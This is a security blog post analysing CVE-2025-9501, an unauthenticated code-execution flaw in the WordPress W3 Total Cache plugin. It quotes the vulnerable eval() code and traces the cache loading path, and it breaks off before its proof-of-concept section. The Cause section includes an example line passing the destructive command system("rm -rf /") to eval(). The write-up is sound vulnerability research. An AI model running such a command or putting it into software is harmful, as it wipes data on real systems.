<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="en">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>CVE-2025-9501 Analysis &amp; POC - Bui Van Y</title><meta name="author" content="Bui Van Y">
<meta name="description" content="Security Vulnerability in WordPress W3 Total Cache Plugin."><meta name="keywords" content='analyst, plugin, remote code execution'>
  <meta itemprop="name" content="CVE-2025-9501 Analysis & POC">
  <meta itemprop="description" content="Security Vulnerability in WordPress W3 Total Cache Plugin.">
  <meta itemprop="datePublished" content="2025-11-22T19:00:00+07:00">
  <meta itemprop="dateModified" content="2025-11-25T21:12:53+07:00">
  <meta itemprop="wordCount" content="1654">
  <meta itemprop="image" content="http://localhost:1313/posts/2025-11-22-cve-2025-9501/app.jpg">
  <meta itemprop="keywords" content="Analyst,Plugin,Remote Code Execution"><meta property="og:url" content="http://localhost:1313/posts/2025-11-22-cve-2025-9501/">
  <meta property="og:site_name" content="Bui Van Y">
  <meta property="og:title" content="CVE-2025-9501 Analysis & POC">
  <meta property="og:description" content="Security Vulnerability in WordPress W3 Total Cache Plugin.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-11-22T19:00:00+07:00">
    <meta property="article:modified_time" content="2025-11-25T21:12:53+07:00">
    <meta property="article:tag" content="Analyst">
    <meta property="article:tag" content="Plugin">
    <meta property="article:tag" content="Remote Code Execution">
    <meta property="og:image" content="http://localhost:1313/posts/2025-11-22-cve-2025-9501/app.jpg">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="http://localhost:1313/posts/2025-11-22-cve-2025-9501/app.jpg">
  <meta name="twitter:title" content="CVE-2025-9501 Analysis & POC">
  <meta name="twitter:description" content="Security Vulnerability in WordPress W3 Total Cache Plugin.">
<meta name="application-name" content="Bui Van Y">
<meta name="apple-mobile-web-app-title" content="Bui Van Y"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/svg-spinners--wind-toy.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/posts/2025-11-22-cve-2025-9501/" title="CVE-2025-9501 Analysis &amp; POC - Bui Van Y" /><link rel="prev" type="text/html" href="http://localhost:1313/posts/2025-11-21-cve-2025-2939/" title="CVE-2025-2939 Analysis &amp; POC" /><link rel="next" type="text/html" href="http://localhost:1313/posts/2025-11-23-cve-2025-30773/" title="CVE-2025-30773 Analysis &amp; POC" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/posts/2025-11-22-cve-2025-9501/index.md" title="CVE-2025-9501 Analysis & POC - Bui Van Y"><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "CVE-2025-9501 Analysis \u0026 POC",
    "inLanguage": "en",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "http:\/\/localhost:1313\/posts\/2025-11-22-cve-2025-9501\/"
    },"image": ["http:\/\/localhost:1313\/images\/avatar.png"],"genre": "posts","keywords": "analyst, plugin, remote code execution","wordcount":  1654 ,
    "url": "http:\/\/localhost:1313\/posts\/2025-11-22-cve-2025-9501\/","datePublished": "2025-11-22T19:00:00+07:00","dateModified": "2025-11-25T21:12:53+07:00","publisher": {
      "@type": "Organization",
      "name": "/images/avatar.png","logo": "http:\/\/localhost:1313\/images\/avatar.png"},"author": {
        "@type": "Person",
        "name": "Bui Van Y"
      },"description": "Security Vulnerability in WordPress W3 Total Cache Plugin."
  }
  </script><script src="/js/head/color-scheme.min.js"></script></head>
  <body data-instant-intensity="viewport" data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title="Bui Van Y"><img class="logo" src='/images/svg-spinners--wind-toy.svg' alt="Bui Van Y" height="32" width="32"><span class="header-title-text">Bui Van Y</span></a><span class="typeit header-subtitle"><template>w41bu1</template></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a class="menu-link" href="/posts/"><i class="fa-solid fa-pencil fa-beat fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
              <a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
            <input type="text" placeholder="Search titles or contents ..." id="search-input-desktop">
            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
            </a>
            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
            </a>
            <span class="search-button search-loading" id="search-loading-desktop">
              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
            </span>
          </li><li class="menu-item theme-switch" role="button" aria-label="Switch Theme" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></li><li class="menu-item language-switch">
            <span role="button" aria-label="Select Language" title="Select Language"><i class="fa-solid fa-language fa-fw" aria-hidden="true"></i></span>
            <ul class="sub-menu"><li class="menu-item"><span class="text-secondary" title="English">English</span></li><li class="menu-item"><a href="/vi/posts/2025-11-22-cve-2025-9501/" class="menu-link" title="Vietnamese">Vietnamese</a></li></ul>
          </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title="Bui Van Y"><img class="logo" src='/images/svg-spinners--wind-toy.svg' alt="Bui Van Y" height="26" width="26"><span class="header-title-text">Bui Van Y</span></a><span class="typeit header-subtitle"><template>w41bu1</template></span></div>
      <div class="theme-switch" role="button" aria-label="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></div>
      <div class="menu-toggle" id="menu-toggle-mobile" role="button" aria-labelledby="menu-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
            <div class="search mobile" id="search-mobile">
              <input type="text" placeholder="Search titles or contents ..." id="search-input-mobile">
              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
              </a>
              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
              </a>
              <span class="search-button search-loading" id="search-loading-mobile">
                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
              </span>
            </div>
            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
              Cancel
            </a>
          </li><li class="menu-item"><a class="menu-link" href="/posts/"><i class="fa-solid fa-pencil fa-beat fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item menu-system"><span class="menu-system-item language-switch">
              <span role="button" aria-label="Select Language" title="Select Language">English<i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i></span>
              <select id="language-select" class="language-select" onchange="location = this.value;"><option value="/posts/2025-11-22-cve-2025-9501/" selected disabled>English</option><option value="/vi/posts/2025-11-22-cve-2025-9501/">Vietnamese</option></select>
            </span></li>
      </ul>
    </nav>
  </div>
</header><div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
  </div>
  <div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"><div class="details related-details open">
      <div class="details-summary related-summary">
        <i class="fa-solid fa-fire fa-fade text-danger fa-fw" aria-hidden="true"></i>
        <span class="related-title">Related Content</span><i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></div>
      <div class="details-content related-content">
        <ul class="related-list"><li class="related-item">
              <a href="/posts/2025-12-02-cve-2025-52756/" title="CVE-2025-52756 Analysis &amp; POC">CVE-2025-52756 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/posts/2025-12-01-cve-2025-3053/" title="CVE-2025-3053 Analysis &amp; POC">CVE-2025-3053 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/posts/2025-11-30-cve-2025-32222/" title="CVE-2025-32222 Analysis &amp; POC">CVE-2025-32222 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/posts/2025-11-28-cve-2025-9321/" title="CVE-2025-9321 Analysis &amp; POC">CVE-2025-9321 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/posts/2025-11-27-cve-2025-13035/" title="CVE-2025-13035 Analysis &amp; POC">CVE-2025-13035 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/posts/2025-11-26-cve-2025-26763/" title="CVE-2025-26763 Analysis &amp; POC">CVE-2025-26763 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/posts/2025-11-25-cve-2025-3439/" title="CVE-2025-3439 Analysis &amp; POC">CVE-2025-3439 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/posts/2025-11-24-cve-2025-48134/" title="CVE-2025-48134 Analysis &amp; POC">CVE-2025-48134 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/posts/2025-11-23-cve-2025-30773/" title="CVE-2025-30773 Analysis &amp; POC">CVE-2025-30773 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/posts/2025-11-21-cve-2025-2939/" title="CVE-2025-2939 Analysis &amp; POC">CVE-2025-2939 Analysis &amp; POC</a></li></ul>
      </div>
    </div></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>CVE-2025-9501 Analysis &amp; POC</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><a href="github.com/w41bu1" title="Author" rel=" author" class="author"><img class="avatar" src='/images/avatar.png' alt="Bui Van Y" height="16" width="16">&nbsp;Bui Van Y</a></span><span class="post-included-in">&nbsp;included in <a href="/categories/cve-analysis/" class="post-category" title="Category - CVE Analysis"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> CVE Analysis</a></span></div><div class="post-meta-line"><span title="published on 2025-11-22 19:00:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-11-22">2025-11-22</time></span>&nbsp;<span title="Updated on 2025-11-25 21:12:53"><i class="fa-regular fa-calendar-check fa-fw me-1" aria-hidden="true"></i><time datetime="2025-11-25">2025-11-25</time></span>&nbsp;<span title="1654 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 1700 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>8 minutes</span>&nbsp;</div>
    </div><div class="featured-image"><img src='/posts/2025-11-22-cve-2025-9501/app.jpg' alt="/posts/2025-11-22-cve-2025-9501/app.jpg"></div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>Contents</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#cve--basic-info">CVE &amp; Basic Info</a></li>
    <li><a href="#requirements">Requirements</a></li>
    <li><a href="#cause">Cause</a></li>
    <li><a href="#analysis">Analysis</a></li>
    <li><a href="#flow">Flow</a></li>
    <li><a href="#proof-of-concept-poc">Proof of Concept (PoC)</a></li>
  </ul>

  <ul>
    <li><a href="#references">References</a></li>
  </ul>
</nav></div>
      </div><div class="content" id="content"><h2 class="heading-element" id="cve--basic-info"><span>CVE &amp; Basic Info</span>
  <a href="#cve--basic-info" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>The WordPress W3 Total Cache plugin prior to version 2.8.13 has a command injection vulnerability via the <code>_parse_dynamic_mfunc</code> function, allowing unauthenticated users to execute PHP commands by submitting a comment with a malicious payload.</p>
<ul>
<li><strong>CVE ID</strong>: <a href="https://www.cve.org/CVERecord?id=CVE-2025-9501"target="_blank" rel="external nofollow noopener noreferrer">CVE-2025-9501</a></li>
<li><strong>Vulnerability Type</strong>: PHP Object Injection</li>
<li><strong>Affected Versions</strong>: &lt;= 2.8.12</li>
<li><strong>Patched Versions</strong>: 2.8.13</li>
<li><strong>CVSS severity</strong>: High (9)</li>
<li><strong>Required Privilege</strong>: Unauthenticated</li>
<li><strong>Product</strong>: <a href="https://wordpress.org/plugins/w3-total-cache/"target="_blank" rel="external nofollow noopener noreferrer">WordPress W3 Total Cache Plugin</a></li>
</ul>
<h2 class="heading-element" id="requirements"><span>Requirements</span>
  <a href="#requirements" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li>
<p><strong>Local WordPress &amp; Debugging</strong></p>
<ul>
<li><a href="https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/"target="_blank" rel="external nofollow noopener noreferrer">Virtual Machine</a></li>
<li><a href="https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/"target="_blank" rel="external nofollow noopener noreferrer">Docker</a></li>
</ul>
</li>
<li>
<p><strong>Plugin Version</strong> - <strong>W3 Total Cache</strong>:</p>
<ul>
<li><code>2.8.12</code> – <strong>vulnerable</strong></li>
<li><code>2.8.13</code> – <strong>patched</strong></li>
</ul>
</li>
<li>
<p><strong>Diff Tool (diff)</strong> → <a href="https://meldmerge.org/"target="_blank" rel="external nofollow noopener noreferrer"><strong>Meld</strong></a> or any diff tool.</p>
</li>
</ul>
<h2 class="heading-element" id="cause"><span>Cause</span>
  <a href="#cause" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>The vulnerability originates from the <code>_parse_dynamic_mfunc</code> function:</p>
<div class="highlight" title="PgCache_ContentGrabber.php v2.8.12" data-open="true"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="hl"><span class="lnt">11
</span></span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">_parse_dynamic_mfunc</span><span class="p">(</span> <span class="nv">$matches</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$code1</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span> <span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$code2</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span> <span class="nv">$matches</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$code</span>  <span class="o">=</span> <span class="p">(</span> <span class="nv">$code1</span> <span class="o">?</span> <span class="nv">$code1</span> <span class="o">:</span> <span class="nv">$code2</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="nv">$code</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$code</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span> <span class="nv">$code</span><span class="p">,</span> <span class="s1">&#39;;&#39;</span> <span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">ob_start</span><span class="p">();</span>
</span></span><span class="line hl"><span class="cl">            <span class="nv">$result</span> <span class="o">=</span> <span class="k">eval</span><span class="p">(</span> <span class="nv">$code</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$output</span> <span class="o">=</span> <span class="nx">ob_get_contents</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="nx">ob_end_clean</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span> <span class="nx">\Exception</span> <span class="nv">$ex</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$result</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="k">false</span> <span class="o">===</span> <span class="nv">$result</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$output</span> <span class="o">=</span> <span class="nx">sprintf</span><span class="p">(</span> <span class="s1">&#39;Unable to execute code: %s&#39;</span><span class="p">,</span> <span class="nx">htmlspecialchars</span><span class="p">(</span> <span class="nv">$code</span> <span class="p">)</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$output</span> <span class="o">=</span> <span class="nx">htmlspecialchars</span><span class="p">(</span> <span class="s1">&#39;Invalid mfunc tag syntax. The correct format is: &lt;!-- W3TC_DYNAMIC_SECURITY mfunc PHP code --&gt;&lt;!-- /mfunc W3TC_DYNAMIC_SECURITY --&gt; or &lt;!-- W3TC_DYNAMIC_SECURITY mfunc --&gt;PHP code&lt;!-- /mfunc W3TC_DYNAMIC_SECURITY --&gt;.&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$output</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>The <code>eval()</code> function at line 11 is very dangerous as it executes a string as PHP code. Example:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$command</span> <span class="o">=</span> <span class="s1">&#39;system(&#34;rm -rf /&#34;)&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">eval</span><span class="p">(</span><span class="nv">$command</span><span class="p">);</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 class="heading-element" id="analysis"><span>Analysis</span>
  <a href="#analysis" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>When the plugin is installed and activated, it adds to the top of <code>wp-config.php</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="sd">/** Enable W3 Total Cache */</span>
</span></span><span class="line"><span class="cl"><span class="nx">define</span><span class="p">(</span><span class="s1">&#39;WP_CACHE&#39;</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span> <span class="c1">// Added by W3 Total Cache
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">...</span></span></span></code></pre></td></tr></table>
</div>
</div><p>This registers caching for WordPress. <code>WP_CACHE</code> is used in <code>wp-settings.php</code>:</p>
<div class="highlight" title="wp-settings.php" data-open="true"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="hl"><span class="lnt">1
</span></span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line hl"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="nx">WP_CACHE</span> <span class="o">&amp;&amp;</span> <span class="nx">apply_filters</span><span class="p">(</span> <span class="s1">&#39;enable_loading_advanced_cache_dropin&#39;</span><span class="p">,</span> <span class="k">true</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">file_exists</span><span class="p">(</span> <span class="nx">WP_CONTENT_DIR</span> <span class="o">.</span> <span class="s1">&#39;/advanced-cache.php&#39;</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">include</span> <span class="nx">WP_CONTENT_DIR</span> <span class="o">.</span> <span class="s1">&#39;/advanced-cache.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span> <span class="nv">$wp_filter</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$wp_filter</span> <span class="o">=</span> <span class="nx">WP_Hook</span><span class="o">::</span><span class="na">build_preinitialized_hooks</span><span class="p">(</span> <span class="nv">$wp_filter</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>WordPress automatically loads <code>advanced-cache.php</code> if it exists. When activated, the plugin creates this file:</p>
<div class="highlight" title="advanced-cache.php" data-open="true"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">defined</span><span class="p">(</span> <span class="s1">&#39;ABSPATH&#39;</span> <span class="p">)</span> <span class="o">||</span> <span class="k">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">global</span> <span class="nv">$w3tc_start_microtime</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$w3tc_start_microtime</span> <span class="o">=</span> <span class="nx">microtime</span><span class="p">(</span> <span class="k">true</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="nx">defined</span><span class="p">(</span> <span class="s1">&#39;WP_INSTALLING&#39;</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">WP_INSTALLING</span> <span class="p">)</span> <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nx">defined</span><span class="p">(</span> <span class="s1">&#39;W3TC_IN_MINIFY&#39;</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nx">defined</span><span class="p">(</span> <span class="s1">&#39;W3TC_DIR&#39;</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
